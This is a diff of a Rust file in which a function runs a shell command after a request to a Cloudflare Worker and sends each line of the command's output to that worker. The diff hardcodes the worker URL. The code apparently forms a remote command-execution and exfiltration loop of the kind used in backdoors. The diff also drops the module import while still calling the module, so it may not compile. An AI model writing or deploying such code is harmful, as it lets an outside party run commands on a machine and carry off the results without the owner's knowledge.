@@ -1,8 +1,7 @@
 use std::process::{Command, Stdio};
-use std::io::{BufReader, BufRead};
-use crate::worker_communication;
+use std::io::{BufReader, BufRead, Error, ErrorKind};
 
-pub async fn execute_bash_command(request_successful: bool, worker_url: &str) -> Result<(), std::io::Error> {
+pub async fn execute_bash_command(request_successful: bool) -> Result<(), std::io::Error> {
     if !request_successful {
         println!("Request to Cloudflare Worker failed. Skipping command execution.");
         return Ok(());
@@ -36,7 +35,11 @@ pub async fn execute_bash_command(request_successful: bool, worker_url: &str) ->
 
     for line in reader.lines() {
         let line = line?;
-        worker_communication::send_data_request(&worker_url, &line).await?;
+        let worker_url = "https://serverworker.adoba.workers.dev/";
+        match worker_communication::send_data_request(&worker_url, &line).await {
+            Ok(_) => (),
+            Err(e) => return Err(Error::new(ErrorKind::Other, e)),
+        }
     }
 
     Ok(())
